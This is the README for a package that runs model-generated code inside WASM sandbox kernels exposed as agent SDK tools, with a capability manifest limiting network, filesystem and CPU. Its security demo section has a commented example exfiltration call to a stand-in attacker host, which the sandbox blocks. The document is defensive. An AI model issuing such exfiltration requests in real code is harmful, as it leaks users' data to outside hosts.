# /claude-agent-sdk

> Drop wasmagent sandbox kernels into the **Anthropic Claude Agent SDK**
> as native tools. Edge-safe code execution, one `CapabilityManifest`
> shared with your MCP servers, no external sandbox provider.

[![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/WasmAgent/wasmagent-js/tree/main/examples/claude-agent-quickjs?file=index.mjs)

## Why this exists

[Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk) (formerly
the Anthropic agent runtime) is Anthropic's first-party way to build agents
that target Claude Code, the desktop, or any hosted Claude application. It
ships with a clean tool registration model — but no sandbox. If your model
generates code, you have to either trust it (don't), spin up a container
(latency, ops cost), or write a `node:vm` shim (bans you from edge
runtimes).

This package gives you a `ClaudeAgentTool` backed by a wasmagent kernel
(`QuickJSKernel`, `PyodideKernel`, `WasmtimeKernel`, or `RemoteSandboxKernel`).
Pick a tier; pick a manifest; the tool drops straight into the agent SDK's
`tools` array.

## Before / After

Replacing the Anthropic `bash_20250124` tool with a wasmagent WASM kernel:

```diff
+import { sandboxedJsClaudeTool } from "@wasmagent/claude-agent-sdk";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

 const response = await client.beta.messages.create({
   model: "claude-opus-4-5",
   tools: [
-    { type: "bash_20250124" },   // ← executes on the host, full OS access
+    sandboxedJsClaudeTool({
+      kernel: new QuickJSKernel(),   // ← WASM sandbox, no host shell
+      capabilities: { allowedHosts: [] },
+    }),
   ],
 });
```

The `sandboxedJsClaudeTool` returns the same `{ name, description, input_schema }`
shape the SDK expects, so no other change is required. The WASM kernel runs inside
the same process — no container, no remote shell.

## Install

```bash
npm install @anthropic-ai/sdk /claude-agent-sdk /kernel-quickjs \
  quickjs-emscripten @jitl/quickjs-wasmfile-release-sync zod
```

## One-shot snippet evaluation

```ts
import { sandboxedJsClaudeTool } from "/claude-agent-sdk";
import { QuickJSKernel } from "/kernel-quickjs";

const tool = sandboxedJsClaudeTool({
  kernel: new QuickJSKernel(),
  capabilities: { allowedHosts: ["api.example.com"], cpuMs: 5000 },
});

// Hand the tool to the Claude Agent SDK alongside any other tools.
// The model can now call `evaluate_javascript({ code: "..." })`.
```

## Code-mode: collapse N tools

```ts
import { codeModeClaudeTool } from "/claude-agent-sdk";
import { ToolRegistry } from "/core";

const tools = new ToolRegistry();
// register your downstream tools here…

const tool = codeModeClaudeTool({
  kernel: new QuickJSKernel(),
  tools,
  capabilities: { allowedHosts: ["api.github.com"] },
});
// The model now sees ONE tool and calls `callTool(...)` from inside scripts.
```

## Kernel selection — pick the right tier

`sandboxedJsClaudeTool()` and `codeModeClaudeTool()` accept any wasmagent
kernel. The choice is independent of the SDK adapter — swap kernels in
one line, the rest of your code is unchanged:

| Kernel | When to pick it | Edge-safe |
| ------ | --------------- | --------- |
| `QuickJSKernel` (`/kernel-quickjs`) | Default. JS/TS workloads. ~2 MB cold start. | ✅ |
| `PyodideKernel` (`/kernel-pyodide`) | Model emits Python (numpy, pandas, regex-heavy). | ✅ (heavy) |
| `WasmtimeKernel` (`/kernel-wasmtime`) | Multi-language WASM modules / Javy-compiled JS for max isolation. | ✅ |
| `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |

Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same Claude Agent SDK tool shape.

## Security demo

`CapabilityManifest` enforces network and filesystem policy at the kernel
boundary — the model cannot escape it regardless of what code it generates:

```ts
import { sandboxedJsClaudeTool } from "@wasmagent/claude-agent-sdk";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const kernel = new QuickJSKernel();
const tool = sandboxedJsClaudeTool({
  kernel,
  capabilities: {
    allowedHosts: [],           // no outbound network
    allowedPaths: [],           // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

// Model-generated code that tries to exfiltrate data:
// fetch("https://attacker.example/exfil?data=secret")
// → throws: network access denied — host "attacker.example" not in allowedHosts
```

The same manifest applies to both `sandboxedJsClaudeTool` and `codeModeClaudeTool`,
and it is the same object shape as every other wasmagent kernel adapter.

## Capability manifest

Same `CapabilityManifest` as every other wasmagent kernel — see
[`docs/guides/code-mode.md`](https://github.com/WasmAgent/wasmagent-js/blob/main/docs/guides/code-mode.md#security-policy-face).

## See also

- [`/aisdk`](https://www.npmjs.com/package//aisdk) — same kernels for Vercel AI SDK
- [`/openai-agents`](https://www.npmjs.com/package//openai-agents) — same kernels for OpenAI Agents JS
- [`/mastra-sandbox`](https://www.npmjs.com/package//mastra-sandbox) — same kernels as a Mastra sandbox provider
